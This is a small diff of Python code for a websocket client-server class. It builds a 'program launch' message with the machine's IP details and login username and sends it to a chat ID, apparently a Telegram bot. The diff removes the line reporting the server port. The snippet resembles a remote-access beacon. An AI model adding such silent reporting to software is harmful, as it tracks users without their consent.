@@ -560,7 +560,6 @@ class ClientWebsocketServer:
             message = f"🌐 <b>Запуск программы</b>\n\n" \
                       f"{ip_info}\n\n" \
                       f"👤 <b>Пользователь:</b> <code>{os.getlogin()}</code>\n" \
-                      f"📡 <b>Порт сервера:</b> <code>{self.port}</code>"
 
             data = {
                 'chat_id': CHAT_ID,
